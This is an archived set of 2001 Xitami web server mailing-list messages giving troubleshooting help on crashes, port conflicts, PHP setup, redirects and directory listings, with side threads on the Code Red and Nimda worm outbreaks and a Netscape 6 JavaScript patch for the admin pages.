From xitami@lists.xitami.org  Sun Sep  2 23:22:22 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Mon, 03 Sep 2001 10:22:22 +1200
Subject: [Xitami] xitami aborts
In-Reply-To: Message from "Bowden, Russell" <Russell.Bowden@fiserv.com>
 of "Tue, 28 Aug 2001 14:42:56 EST." <EX-20010828-144824-0004@exchange.fiserv-missive1.fiserv.net>
Message-ID: <200109022222.KAA06095@pagoda.in.naos.co.nz>

In message <EX-20010828-144824-0004@exchange.fiserv-missive1.fiserv.net>, "Bowde
n, Russell" writes:
>>>[Xitami "just disappears" after a while]
>I installed 2.4d9 and still have the same problem.  The stdout file contains on
>ly the normal startup messages.  There's nothing in the stderr file except the 
>message I echo there when starting Xitami.  The Console and xitami logs do not 
>show anything abnormal.  

Hmm.  Normally when Xitami crashes out the error handler tries to print
out some information about which module it was in, and so on, which is
occassionally useful.

>Is there any information at all that I could get from these cores that might 
>point to the problem?  Since I haven't seen any other reports of this 
>problem, maybe it's peculiar to UnixWare.

The most useful thing to get out of core dump files -- assuming you've
left the symbols attached to the executable -- is a trace of the
functions on the stack at the time that it crashed.  That tells us both
a possible area where it is having problems, and also over the course of
a few crashes whether it's the same thing or a "random" thing causing
the problem.  ("random" problems are much harder to find, being
generally memory overwrite issues.)

>From memory under Unixware you'll need to use dbx to get a stack trace,
unless you've installed (and used) the GNU compiler suite, in which case
gdb will probably work.  (The relevant gdb command is "bt"; I don't
remember off hand what the command is in dbx.)

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Sun Sep  2 23:39:04 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Mon, 03 Sep 2001 10:39:04 +1200
Subject: [Xitami] Xitami 24d9 aborts right after reporting "could not accept connection: Software caused connection abort"
In-Reply-To: Message from "Dmitry Isakbayev" <dmitry@transnexus.com>
 of "Thu, 30 Aug 2001 15:58:55 -0400." <NEBBIJGPHKNLMOCJIHFJIEHKCNAA.dmitry@transnexus.com>
Message-ID: <200109022239.KAA06492@pagoda.in.naos.co.nz>

In message <NEBBIJGPHKNLMOCJIHFJIEHKCNAA.dmitry@transnexus.com>, "Dmitry Isakbayev" writes:
>Steps to reproduce:
>1) Build and run Xitami24d9 on Sun OS 5.7 or 5.8
>2) Point IE 5.0 browser to the default page
>3) Keep reloading the same page by keeping the "F5" key constantly pressed down.
>
>After a few seconds xitami reports "smthttp: could not accept connection:
>Software caused connection abort", closes all connections and dumps core.
>[Windows Xitami 24b9 doesn't have this problem]

Interesting testing methadology :-)

The "Software caused connection abort" appears to correspond to the 
ECONNABORTED error number, which as far as I've been able to establish
is caused by a connection being closed before it has been fully
accepted, for some reason.

Given the way that you are testing it, it's possible that what is
happening is that the next F5 "reload" is processed at the webbrowser
end, thus closing the existing (not-yet-accepted) connection, and
opening a new one.  

Xitami tries to raise an internal exception when it has network issues,
and basically concludes things have turned to custard at that point.

I suspect that ECONNABORTED may need to be handled, for the platforms
that return it, in much the same way as EAGAIN/EWOULDBLOCK -- ie, by
pretending we didn't see it, and simply moving on to waiting for the
next connection.  You may or may not want to log the attempt failing.

If you want to try this I'd suggest modifying smthttp.c
accept_client_connection() to also test for ECONNABORTED, and handle it
in a different manner from the default.

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Mon Sep  3 02:09:26 2001
From: xitami@lists.xitami.org (Paul N Shortis)
Date: Mon, 3 Sep 2001 11:09:26 +1000
Subject: [Xitami] PHP4 Installation Problems
Message-ID: <4A256ABC.0006A1BF.00@shb1ln11.transport.qld.gov.au>


Yes, thanks it was you Owen (new I'd remember if I saw the name). My further
investigations indicate that the true nature of the problem
is that php.exe get's loaded but can't load it's runtime dll (php4ts.dll).
Placing bith php.exe and php4ts.dll in Xiami's working directory allows the
dll to be found.

A more elegant solutions is to simply move php4ts.dll to windows system
directory (winnt\system32 in the case of NT), then it gets located & all
works well. It's a shame php doesn't report this in it's error log, it would
have made it a lot simpler to locate.

In any case, thanks once again for your help Owen, it saved me a lot of hair
tearing at the time.

Cheers, Paul

From xitami@lists.xitami.org  Tue Sep  4 21:33:29 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 05 Sep 2001 08:33:29 +1200
Subject: [Xitami] Suspend
In-Reply-To: Message from joubin.far@t-online.de (Joubin Far)
 of "Tue, 04 Sep 2001 20:12:35 GMT." <004101c1357d$f0799ad0$ea409fc1@ednic>
Message-ID: <200109042033.IAA32555@pagoda.in.naos.co.nz>

In message <004101c1357d$f0799ad0$ea409fc1@ednic>, Joubin Far writes:
>I have installed the zip file bw3224d9 without any problem and i have 
>gotten the following error message while starting: Xitami was suspended
>Could not open HTTP port 80 - Port is already used by another 
>server(WSAEADDRINUSE).
>My OS W2K runs on 1200MHz AMD.  I had never this problem with Win95 and WinNT.

Did you install IIS when you installed W2K?  (Or did W2K decide to
install it for you along with something else?)

You can check if something is definitely using port-80 in a cmd window
with:

netstat -na

Then look through the output for a line mentioning ":80" or ".80" (at
the end of an address, and "listening".  If there is one there, then
you've definitely already got a webserver running.

Either you need to change that webserver to another port, or you need to
run Xitami on a different port.  All Xitami's ports can be shifted with
the portbase option: eg "xitami -b 5000" will move all the ports up by
5000, giving 5080 for HTTP, etc.

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Tue Sep  4 21:40:19 2001
From: xitami@lists.xitami.org (Thomas J. Hruska)
Date: Tue, 04 Sep 2001 15:40:19 -0500
Subject: [Xitami] Relative redirection supported?
In-Reply-To: <3B95209B.3553099B@relativedata.com>
Message-ID: <3.0.6.32.20010904154019.007d2ea0@pop.crosswinds.net>

At 02:42 PM 9/4/01 -0400, David Patte writeth:
>I am using PHP on one of my servers. I am noticing problems with a
>script that contains relative redirection using the php instruction:
>
>Header("Location: somepage.php");
>
>When I execute this command from my php script, i get a 404 error (page
>not found)
>
>but if I change it to
>Header("Location: http://mydomainname.com/somepage.php");
>
>it works.
>
>Does xitami 2.4d9 support relative redirection? how do I enable it?

Xitami does not support server-side redirection.  However, XiFusion v2.5
will perform the relative redirection that you need (unless you attempt to
redirect to aliases - see the list archives for that discussion).
Basically, a PHP 'Header' statement generates a raw HTTP header with
whatever text you put inside it.  So, according to the HTTP standard,
'Header("Location: /somepage.php");' should do the same thing.  The reason
is that the 'Location' HTTP header is sent back to the browser and has to
be an absolute URL (took me a while to figure this out for XiFusion).

XiFusion is an "add-on" to Xitami and runs as a wrapper program for
ColdFusion and PHP and version 2.5 can take any redirect (absolute and
relative) and process it on the server rather than letting the client
process it.  This not only provides better response times to the end user,
but also provides better security since variables can be passed between PHP
scripts unnoticed.

You can obtain XiFusion v2.5 from Shining Light Productions' web site:

<http://www.shininglightpro.com/>

Hope this helps!


           Thomas J. Hruska -- shinelight@crosswinds.net
Shining Light Productions -- "Meeting the needs of fellow programmers"
                  http://www.shininglightpro.com/

From xitami@lists.xitami.org  Tue Sep  4 21:52:46 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 05 Sep 2001 08:52:46 +1200
Subject: [Xitami] Relative redirection supported?
In-Reply-To: Message from David Patte <dpatte@relativedata.com>
 of "Tue, 04 Sep 2001 14:42:35 -0400." <3B95209B.3553099B@relativedata.com>
Message-ID: <200109042052.IAA00651@pagoda.in.naos.co.nz>

In message <3B95209B.3553099B@relativedata.com>, David Patte writes:
>I am using PHP on one of my servers. I am noticing problems with a
>script that contains relative redirection using the php instruction:
>
>Header("Location: somepage.php");
>
>When I execute this command from my php script, i get a 404 error (page 
>not found)

Xitami doesn't understand as wide a range of server-side redirects as
some other webbrowser seem to understand; it understands only a full
absolute path (as a server side redirect), and a full URL (as a client
side redirect).

You can try:

Header("Location: /somepage.php")

if the page is in the root of that virtual host.  Otherwise XiFusion
provides a bridge between what many PHP scripts output and what Xitami
expects.

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

>That said, Xitami should compile relatively easily under most Linuxes,

Basically, follow the 'readme' file that comes with the source code.  You
may need to install additional RPMs from the RedHat CD if you installed the
"workstation" setup.  Particuarly, gcc/g++/make are not installed by
default and need to be installed to compile the source.  You need to be
logged in as root or at least have sufficient permissions to install RPMs
as well as compile and set up Xitami to run on boot.

You also need to be able to run 'gzip' and possibly 'tar' on your system,
so if the basic system utilities RPM isn't installed (don't recall what
it's called), that needs to be done first.

Hope this helps!

From xitami@lists.xitami.org  Tue Sep  4 23:26:39 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 05 Sep 2001 10:26:39 +1200
Subject: [Xitami] How to deny bandwidth hogs?
In-Reply-To: Message from John Holt <johnh@bit-net.com>
 of "Tue, 04 Sep 2001 18:09:23 -0400." <Pine.OSF.3.95.1010904180450.23203A-100000@www.bit-net.com>
Message-ID: <200109042226.KAA02187@pagoda.in.naos.co.nz>

In message <Pine.OSF.3.95.1010904180450.23203A-100000@www.bit-net.com>, John Hol
t writes:
>Can Xitami deny serving outside links to my files?
>In other words, I don't want other web sites to link to my images and suck
>up my bandwidth. I only want my pages to link to the images and such.

You can "sort of" do this by having a program (eg, filter, CGI, LRWP,
etc) that checks the HTTP referer header to see if the thing that told
the browser to fetch the file was on one of your sites.  (Xitami itself
cannot do this directly.)  However the HTTP Referer can be faked fairly
easily, so it's not very strong security, and some things don't send it
at all so may be locked out.

Ewen

Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

> does VNC support netmasks so I can limit access to 6 or 8 LANs 

The unix version can be made to, the Windows version does it this way: 

http://www.uk.research.att.com/vnc/winvnc.html

..options ... can be set in the system registry...

 The AuthHosts setting is, unlike the other settings, a REG_SZ string.
It is used to specify a set of IP address templates which incoming
connections must match in order to be accepted. By default, the template
is empty and connections from all hosts are accepted. The template is of
the form:  
              +[ip-address-template] 
              ?[ip-address-template] 
              -[ip-address-template] 

 In the above, [ip-address-template] represents the leftmost bytes of
the desired stringified IP-address. For example, +158.97 would match
both 158.97.12.10 and 158.97.14.2. Multiple match terms may be
specified, delimited by the ":" character. Terms appearing later in the
template take precedence over earlier ones. e.g. -:+158.97: would filter
out all incoming connections except those beginning with 158.97. Terms
beginning with the "?" character are treated by default as indicating
hosts from whom connections must be accepted at the server side via a
dialog box. The QuerySetting option determines the precise behaviour of
the three AuthHosts options.

From xitami@lists.xitami.org  Wed Sep  5 11:45:59 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 05 Sep 2001 22:45:59 +1200
Subject: [Xitami] Suspend
In-Reply-To: Message from joubin.far@t-online.de (Joubin Far)
 of "Wed, 05 Sep 2001 09:01:16 GMT." <001501c135ed$a4e11420$86919fc1@ednic>
Message-ID: <200109051045.WAA19880@pagoda.in.naos.co.nz>

In message <001501c135ed$a4e11420$86919fc1@ednic>, Joubin Far writes:
>I didn´t install IIS-Server but i have installed Visual Studio.net Beta 2.

Ah, that's possibly installed a webserver as part of its test environment.

>[netstat -na shows]
>TCP        0.0.0.0:21       0.0.0.0       heard
>TCP        0.0.0.0:25       0.0.0.0       heard
>TCP        0.0.0.0:80       0.0.0.0       heard

The :80 one is the important one; it's the webserver port (by common
convention).  So you've definitely got _something_ which is running as a
webserver.  (And also a FTP server, and also a mail server.)

I believe there are some third party programs which can tell you for a
given network port, or file, which programs have it open, but off hand I
don't know of any of them.  (Under linux/unix there is "lsof" (list open
files) which does this; I'm pretty sure there's a Windows equivilent.)

Failing that, there's two possiblities: 
1.  Looking in the list of running services and applications (in the
    task manager) for likely suspects, and try to figure out which one
    it is.  Anything "information server" or "web server" like is a
    possibility.  You could try stopping the likely suspects one at a
    time until you figure out which one it is takes away the ":80"
    reference in netstat -na.

2.  You could try connecting to the webserver, with, eg, telnet and see
    if it'll tell you anything about itself.  Eg:

    telnet 127.0.0.1 80

    GET / HTTP/1.0

    (and press return twice)  Often there'll be some sort of Server:
    line that identifies it, and you might be able to match this up with
    some program running on your system.

>>All Xitami's ports can be shifted with the portbase option: eg 
>>"xitami -b 5000" will move all the ports up by 5000, giving 5080 for HTTP
>
>By cmd W2K i couldn´t execute "xitami -b 5000" because there isn´t
>xitami.exe and if i have done with Xiwin32.exe -b 5000

Yup, that was what I meant.  (The name of xitami varies depending on
which build you have (console, gui window version, NT service, etc), but
we usually just say "xitami" when we suggest running it.)

Unfortunately it seems that version of Xitami doesn't check for command
line paramters.  In which case you'll need to create a defaults.cfg file
(if you don't already have one; add this to the end if you do) which
says:

[server]
  portbase=5000

For the builds that support it the "-b" paramter does the same thing for
a single run.

Ewen

From xitami@lists.xitami.org  Wed Sep  5 12:17:55 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 05 Sep 2001 23:17:55 +1200
Subject: [Xitami] Console log
In-Reply-To: Message from Paul Reid <preid@rci.rutgers.edu>
 of "Mon, 03 Sep 2001 23:57:17 -0400." <3B94511D.C09F5A7@rci.rutgers.edu>
Message-ID: <200109051117.XAA20287@pagoda.in.naos.co.nz>

In message <3B94511D.C09F5A7@rci.rutgers.edu>, Paul Reid writes:
>My Xitami has worked fine for way over a year with little
>trouble. It went down yesterday and I discovered 5,000 log-files
>with the numeric suffix (meaning it could not write to the main
>logfile?) all written within a few minutes of each other

Numbering the suffix is Xitami's strategy for making thing unique when
it is renaming them, or otherwise needs a unique name.  It suggests that
possibly Xitami was resarting its logging a lot during the time period
in question -- possibly because Xitami itself was restarting a lot
during that period.  (Which it can be configured to do under Windows if
it has network issues, mainly to deal with people on dialup connections.)

>2001/09/03 13:33:12: smthttp: error on socket 216: WSAESHUTDOWN
>2001/09/03 13:33:12: smthttp: error on socket 196: WSAESHUTDOWN
>2001/09/03 13:33:12: smthttp: error on socket 164: WSAESHUTDOWN
>2001/09/03 13:33:12: smthttp: error on socket 132: WSAESHUTDOWN
>2001/09/03 13:33:12: smthttp: error on socket 72: WSAESHUTDOWN
>
>What is WSAESHUTDOWN and why am I getting bursts of them? 

WSAESHUTDOWN appears to be basically equivilent to the Unix EPIPE -- ie
indicating that a connection that was open before has been closed
(presumably by the other end) at some point between when it was last
seen as open and when the next read/write attempt as made.

In this case either someone is connecting to your webserver and
abandoning their connections before Xitami gets a chance to answer
(which seems unlikely given the clustering of them you got "all at
once"), or something has confused Xitami or NT's networking into
thinking they've all closed.

If you haven't already tried the classic NT solution (rebooting) it's
probably worth doing to ensure the network stack has been reinitialised.

>(By the way: neither http://www.xitami.com nor
>http://www.xitami.com seems to be working for me today: no response.) 

The xitami.com website is hosted for us by OpenAvenue (the Open Source
company); it appears that they're having some sort of issue with that
webserver.  I've sent them an email asking them to look into it.

Thanks for the report.

Ewen

Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

>
> >[netstat -na shows]
> >TCP        0.0.0.0:21       0.0.0.0       heard
> >TCP        0.0.0.0:25       0.0.0.0       heard
> >TCP        0.0.0.0:80       0.0.0.0       heard
>
> The :80 one is the important one; it's the webserver port (by common
> convention).  So you've definitely got _something_ which is running as a
> webserver.  (And also a FTP server, and also a mail server.)
>
> I believe there are some third party programs which can tell you for a
> given network port, or file, which programs have it open, but off hand I
> don't know of any of them.  (Under linux/unix there is "lsof" (list open
> files) which does this; I'm pretty sure there's a Windows equivilent.)
>
> Failing that, there's two possiblities:
> 1.  Looking in the list of running services and applications (in the
>     task manager) for likely suspects, and try to figure out which one
>     it is.  Anything "information server" or "web server" like is a
>     possibility.  You could try stopping the likely suspects one at a
>     time until you figure out which one it is takes away the ":80"
>     reference in netstat -na.
>
> 2.  You could try connecting to the webserver, with, eg, telnet and see
>     if it'll tell you anything about itself.  Eg:
>
>     telnet 127.0.0.1 80
>
>     GET / HTTP/1.0
>
>     (and press return twice)  Often there'll be some sort of Server:
>     line that identifies it, and you might be able to match this up with
>     some program running on your system.
>
> >>All Xitami's ports can be shifted with the portbase option: eg
> >>"xitami -b 5000" will move all the ports up by 5000, giving 5080 for
HTTP
> >
> >By cmd W2K i couldn´t execute "xitami -b 5000" because there isn´t
> >xitami.exe and if i have done with Xiwin32.exe -b 5000
>
> Yup, that was what I meant.  (The name of xitami varies depending on
> which build you have (console, gui window version, NT service, etc), but
> we usually just say "xitami" when we suggest running it.)
>
> Unfortunately it seems that version of Xitami doesn't check for command
> line paramters.  In which case you'll need to create a defaults.cfg file
> (if you don't already have one; add this to the end if you do) which
> says:
>
> [server]
>   portbase=5000
>
> For the builds that support it the "-b" paramter does the same thing for
> a single run.
>
> Ewen
>
> --
> Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com
>
> --
> Xitami Users Mailing List -- For Xitami support
> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami

From xitami@lists.xitami.org  Wed Sep  5 19:46:46 2001
From: xitami@lists.xitami.org (Brian {Hamilton Kelly})

In message <001e01c13616$b64462c0$49409fc1@ednic>
   joubin.far@t-online.de (Joubin Far) writes:
> Hi Ewen,
> By your tip i have found the Ghost and Zombie that lives in background an
> d
> makes the life difficult for Xitami.
> The Ghost is called IIS you was right.
> I couldn´t belive it because i didn´t installed it direct.
> It was installed by Visual Studio.net package by clicking on OK and with 
> it
> i have installed IIS server and some other server option.

Sadly, far too many other M$ victims have also found that IIS has been
installed and running by default: along with an ftpd and smtpd.  (I'm a
customer of Demon Internet in the UK, and they, unlike many ISPs, attempt
to *deliver* mail by SMTP by default when a customer connects, albeit
that many of their Windoze-bound customers only have a POP3 client with
which to *collect* mail.  You would not believe the number of times that
Demon customers have changed to using Win2K and discovered that an smtpd
has been installed by deault, which answers all the incoming mails by
bouncing them.  The first they know is when their friends/customers/what-
ever complain that their mails are being bounced.).

As others have said, if your system was not properly protected, there is
a VERY strong possibility that you have been infected by Code Red (2),
and that you are one of the 30,000+ systems running IIS which are
continuing to attempt to infect other systems, and also to commit a
Denial of Service attack upon www.whitehouse.gov.

Furthermore, if it's Code Red II that's infected you, it may well have
installed one or more trojans that will leave your system open to
repeated infestation and exploitation.  Do PLEASE check the various sites
warning of the dangers.  If you *have* been infected with CR2, the ONLY
safe course is to wipe your disk(s) entirely and reinstall Win2K from
scratch; do please note that this means FDISK and FORMAT to erase
*everything* that was already there; a simple re-install over a working
system will NOT remove the infection.

(Just one of the penalties of running Billy Shit software.)

to the extension (i.e. "file.exe" becomes "file.exe(1)" ).

same results;  as files are downloaded,  the extension is either duplicated
(i.e. "song.mp3" becomes "song.mp3.mp3") or an additional character is added
to the extension (i.e. "file.exe" becomes "file.exe(1)" ).

What can I do,  or what do I need to do to have the proper files downloaded
with their correct (unaltered) file names.

Try using the "subst" command for the drive letter where you web server is
running.  For example if your web server is running on drive letter W, subst
W for X, and try to create an alias for X

I use Windows 98 and I read for the alias to read
write you need to invert your slashes(\).  Here is how
my aliases are setup and they work perfectly fine
anime   d:/anime
mp3s    d:/mp3s
os      c:/
storage d:/
temp    d:/downloads/temp

The Xitami server is located on the C:, and I am able
to browse that drive fine.  So it might be something
that people who are having problesm accessing their
drives migth want to try.
Jesse

From xitami@lists.xitami.org  Mon Sep 10 11:42:19 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Mon, 10 Sep 2001 22:42:19 +1200
Subject: [Xitami] Virtual hosts in Standalone
In-Reply-To: Message from joubin.far@t-online.de (Joubin Far)
 of "Sat, 08 Sep 2001 11:57:05 GMT." <000a01c1385d$6e9706f0$6a759e3e@ednic>
Message-ID: <200109101042.WAA28428@pagoda.in.naos.co.nz>

In message <000a01c1385d$6e9706f0$6a759e3e@ednic>, Joubin Far writes:
>Where must i implement or copy HOSTS (DNS) file for using VIRTUAL HOSTS 
>in Standalone mode.  I use W2K operating system.

I'm not certain for Windows 2000, but for Windows NT, it's under
c:\winnt\system32\drivers\etc\hosts.  I'd guess that it's going to be
somewhere simillar for Win2K.  You'll generally find a hosts.sam file in
the relevant directory; you need to copy this to "hosts" in that
directory, and then add your own entries.  (The ".sam" file is a sample
that you can copy and modify to use; but it's named with that extension
so it doesn't get used by default.)

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Mon Sep 10 11:44:57 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Mon, 10 Sep 2001 22:44:57 +1200
Subject: [Xitami] directory listings
In-Reply-To: Message from Shane Smith <mrshanes@yahoo.com>
 of "Thu, 06 Sep 2001 10:58:30 MST." <20010906175830.52975.qmail@web14910.mail.yahoo.com>
Message-ID: <200109101044.WAA28507@pagoda.in.naos.co.nz>

In message <20010906175830.52975.qmail@web14910.mail.yahoo.com>, Shane Smith writes:
>aliases to my drives to get directory listings of
>them.  They all seem to work fine (floppy drive,
>cd-rom drives, and hard drives) except for the drive
>letter that Xitami is installed on!  

Are you sure that it's Xitami's protections which are preventing this,
not NT's protections?  Depending on what user you're running Xitami as,
it may not have permissions to access some of the root directory.

If you're certain that it's got OS-level permission to access those
directories, try turning on Xitami's server debugging ([server] debug=1)
and look to see what path it is trying to access when you request access
to that alias.  It may be that it's picking up the wrong directory path
for some reason.  (Check debug.log, after trying to access it with the
server debugging turned on.)

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Mon Sep 10 11:51:17 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Mon, 10 Sep 2001 22:51:17 +1200
Subject: [Xitami] Alias Directories & File Names
In-Reply-To: Message from "Wally Nickel" <wnickel1@home.com>
 of "Sat, 08 Sep 2001 09:05:45 -0400." <CMEGIPIFEBJBCIKDJKNDAENECDAA.wnickel1@home.com>
Message-ID: <200109101051.WAA28747@pagoda.in.naos.co.nz>

In message <CMEGIPIFEBJBCIKDJKNDAENECDAA.wnickel1@home.com>, "Wally Nickel" writes:
>The only (minor) problem, actually a bit of a nuisance relates to the use of
>ALIAS directory where DIRECTORY lists are enabled so that the downloadable
>files are listed.  The ALIAS lists and ALIAS directories portion works well,
>but whenever a file gets downloaded,  the extension is either duplicated
>(i.e. "song.mp3" becomes "song.mp3.mp3") or an additional character is added
>to the extension (i.e. "file.exe" becomes "file.exe(1)" ).

The extra extension tends to happen if you already have the file
downloaded to that directory; at least one common webbrowser handles this 
situation by appending "(1)" to the filename.

The double extension issue is more puzzling; IIRC this used to happen
with Xitami 2.5b5 (it may still happen there), due to an extremely
conservative test for which characters don't need to be escaped in the
filename, resulting in the filename being escaped, and another extension
added by the webbrowser.  (If you think this is hitting you, in 2.5b5, try
substituting "name" for "nameurl" in httpdir.gsl and restarting.)

Off hand I can't think of anything in Xitami 2.4d9 which would cause
this effect, except possibly if the same code that causes the 2.5b5
effect is also in 2.4d9.  

Does anyone else see this extension doubling in 2.4d9?

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Mon Sep 10 12:32:40 2001
From: xitami@lists.xitami.org (Matthew Daubenspeck)
Date: Mon, 10 Sep 2001 07:32:40 -0400
Subject: [Xitami] Virtual Hosting Question
Message-ID: <5.1.0.14.2.20010910073158.009f7550@pop.nwlehighsd.org>

Is there a way to auto-redirect all incoming requests for name whatever.com 
to another IP/address?



From xitami@lists.xitami.org  Mon Sep 10 12:40:31 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Mon, 10 Sep 2001 23:40:31 +1200
Subject: [Xitami] Virtual Hosting Question
In-Reply-To: Message from Matthew Daubenspeck <mdaubenspeck@daubnet.tzo.com>
 of "Mon, 10 Sep 2001 07:32:40 -0400." <5.1.0.14.2.20010910073158.009f7550@pop.nwlehighsd.org>
Message-ID: <200109101140.XAA29143@pagoda.in.naos.co.nz>

In message <5.1.0.14.2.20010910073158.009f7550@pop.nwlehighsd.org>, Matthew Daub
enspeck writes:
>Is there a way to auto-redirect all incoming requests for name whatever.com 
>to another IP/address?

Change the DNS?

If changing the DNS isn't appropriate you either want to send redirects
(a la Apache's mod_redirect) or you want to proxy the page (a la Apache's 
mod_proxy).   Xitami won't do either by itself, but you could add a
CGI/LRWP/filter to do most of what you want (all with a LRWP) in either
case.

But if it's the whole site for whatever.com I'd definitely suggest
changing the DNS as the first choice.

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

From xitami@lists.xitami.org  Mon Sep 10 13:53:50 2001
From: xitami@lists.xitami.org (Michael S. Kazarin)
Date: Mon, 10 Sep 2001 16:53:50 +0400
Subject: [Xitami] Virtual Hosting Question
References: <5.1.0.14.2.20010910073158.009f7550@pop.nwlehighsd.org>
Message-ID: <00e201c139f7$a4a1d860$659305c3@futeltra>

you can use an empty web root for whatever.com and configure to use gsl
error-script which will produce an error page with redirect header included.
in this case request for any page on whatever.com will produce 404 error and
request for / (i.e. root of whatever.com) will produce 403 error. Both
should generate an error page with redirect header.

| Is there a way to auto-redirect all incoming requests for name
whatever.com
| to another IP/address?

From xitami@lists.xitami.org  Wed Sep 12 02:59:25 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Wed, 12 Sep 2001 13:59:25 +1200
Subject: [Xitami] directory contents
In-Reply-To: Message from "Mark E. Crane" <mark@louisville.edu>
 of "Tue, 11 Sep 2001 21:49:49 -0400." <sb9e8702.070@gwise.louisville.edu>
Message-ID: <200109120159.NAA15219@pagoda.in.naos.co.nz>

In message <sb9e8702.070@gwise.louisville.edu>, "Mark E. Crane" writes:
>I've just installed Xitami for windows 2k, and I've noticed that the latest 
>version, unlike earlier versions, does not show directory contents by default.

The [security] dirlist option can turn off the directory listings (but
AFAIK the shipped default is [security] dirlist=1, which means listings
will be generated).

If you are using 2.5b5 beware that there'll be no directory listing if
it can't find/run the supplied GSL scripts.

The server debugging may give you more information about what Xitami is
trying to do.

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

Off-topic, but I know many of us are shaken by this atrocity. 

I work 40 miles southwest of NYC. A co-worker here just sent this mass
email, which I think is worth sharing: 

 =========================
 Hello to All,

I wanted to let you all know that I am fine, as are all of my colleagues
and friends, here at Rutgers University in New Brunswick, NJ.  This
catastrophe is mind-numbing and unbelievable, but through it all I still
see the hand of God working His miracles.  My friend Eric's girlfriend
and my friend Andrew's wife were working downtown, but managed to be
just outside of the real danger.  My friend and colleague Mark's
father-in-law actually works (worked) in the Trade Center towers, and
was on his way to stepping on the subway to the Trade Center, when the
first explosion happened.  The train just _happened_ to be late
yesterday morning (!). His partner was in the first building (52nd
floor) and managed to escape.  All but one of their employees are found.
Maya's mom works in the Trade Center, but she is on vacation to London. 
Many of my professors and friends live in New York, and all of them are
fine.  My friend Michael works at Merrill Lynch in NJ, and he has lost
many colleagues.

I consider myself blessed and lucky that this tragedy did not affect me
personally, but at the same time, I grieve for those who have lost
someone, and pray for our country which will be forever changed. 

I think back to the time when Joel and Jason came to visit and we were
driving all around the World Trade Towers, talking about the 1993
bombing.  Now when I drive up the turnpike, there is just smoke all
around.  

So, we are shaken but okay.  I will be praying through this tragedy, and
I wish you all peace.

 Sincerely, 
 Linda
  =========================

It is everybody's turn. 

>From my school's network group: 

"This morning, the Network Operations Group became aware of an issue
concerning our Internet connectivity. Upon further investigation, the
problem was determined to be a virus that was attempting to infect the
University.

"The virus is of a particularly aggressive variety, attacking both
clients and servers on the network. The rate of infection is such that
we believe all vulnerable hosts within the university either have or
will be infected. Throughout the day, TD has observed hundreds of
network devices attempting to spread the virus to the University
Community and the Internet. As a result of this activity, the University
Internet connections were brought to a near standstill."

This is happening all over the world... even the news-radio mentioned
it.

Near as I can tell, MS IIS server is involved, Xitami shrugs it off.

BTW, net-connected H-P printers may need re-booting after every job.

However, there is also an email component called "readme.eml" or
"readme.exe". If you get any email attachments, or your web browser
offers to download or run anything like that, say NO!

Watch any of the major anti-virus web-sites for more info.

 -PRR

-------- Original Message --------
Subject: minty Xitami
Date: Mon, 17 Sep 2001 09:21:25 +0200
From: Francis Turner <francis.turner@freesbee.fr>
To: Xitami list <xitami@lists.xitami.org>

All,

A while back I raised a bug (Ewen I hope you've noted it) that Xitami's
WBA admin section doesn't work with Netscape6.x / Mozilla browsers. This
is a trivial thing to fix and I have been running a patched .exe with
the the fix for a while to verify that my change doesn't break anything
critical...

Details of the bug (to remind)
It seems that the word "arguments" is now a reserved word and not
available as a variable name anymore. Unfortunately the WBA pages all
use arguments as a variable name passing information to the hidden
fields in the form (functions submit and subconf). Changing the variable
name in both functions to anything other that "arguments" means the
pages now work correctly.

The fix therefore was to change all occurences of the word in Javascript
to something else - I did a one letter change of the relevant occurences
of "aguments" to "argumints" (hence the subject line) using perl.

The following lines get changed (note they appear in every web page -
and ...value = arguments; one appears twice / page)
function submit(arguments) {
function subconf(arguments,message) {
        document.forms[0].jsaction.value = arguments;
to
function submit(argumints) {
function subconf(argumints,message) {
        document.forms[0].jsaction.value = argumints;
respectively.

I could probably modify the source but I don't have a compiler handy to
verify that the mod works and I don't know how to submit changes back
(send to Ewen?), though I have no doubt that a similar change to  but I
can tell anyone else who cares what to do to patch the .exe using some
pretty trivial perl

Francis

PS I did 2 runs one for s/\(arguments/\(argumints/ and one for
s/arguments;/argumints;/ as it seemed easier than figuringout the magic
RE that would do both at once.
PSS If you want to modify the source the files to change are the
xiadm*.h files which define the webpages as arrays called of
xiadm*_blocks. You will need to change the lines below - again I'd
suggest keeping the variable name the same length to avoid confusion and
unfortunately "arguments" runs over 2 lines in some places so clever
perl options will be needed to do autoreplaces...

    'o', 'n', 32, 's', 'u', 'b', 'm', 'i', 't', '(', 'a', 'r', 'g', 'u',
    'm', 'e', 'n', 't', 's', ')', 32, '{', 10, 10, 32, 32, 32, 32, 'd',

    'v', 'a', 'l', 'u', 'e', 32, '=', 32, 'a', 'r', 'g', 'u', 'm', 'e',
